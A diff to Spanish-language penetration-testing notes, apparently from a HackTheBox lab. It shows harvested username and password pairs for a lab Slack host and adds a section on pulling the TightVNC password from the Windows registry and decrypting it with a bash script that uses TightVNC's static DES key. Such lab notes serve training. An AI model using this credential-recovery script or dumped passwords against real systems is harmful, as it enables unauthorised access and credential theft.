@@ -187,3 +187,39 @@ https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
 https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
 https://slack.streamio.htb:b'JDgodd',b'password@12'
 ``` 
+
+## TightVNC password attack
+- dentro de los registros de windows, podemos encontrar el tightvnc password en la siguiente ruta:
+- HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
+- Que va a contener `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`
+- En nuestra maquina atcante podemos utilizar un script que usa openssl para desencriptar la contraseña
+
+```bash
+#!/bin/bash
+
+# Clave DES estática usada por TightVNC
+KEY="e84ad660c4721ae0"
+
+# Hex input (ej: 6bcf2a4b6e5aca0f)
+read -p "Hexadecimal VNC password: " HEX
+
+# Archivo temporal
+ENC_FILE=$(mktemp)
+DEC_FILE=$(mktemp)
+
+# Convertir el hex a binario
+echo "$HEX" | xxd -r -p > "$ENC_FILE"
+
+# Desencriptar con OpenSSL usando DES-ECB
+openssl enc -d -des-ecb -in "$ENC_FILE" -out "$DEC_FILE" -K "$KEY" -nopad 2>/dev/null
+
+# Mostrar resultado
+echo -n "La contraseña es: "
+cat "$DEC_FILE"
+echo
+
+# Limpiar archivos temporales
+rm "$ENC_FILE" "$DEC_FILE"
+``` 
+
+----
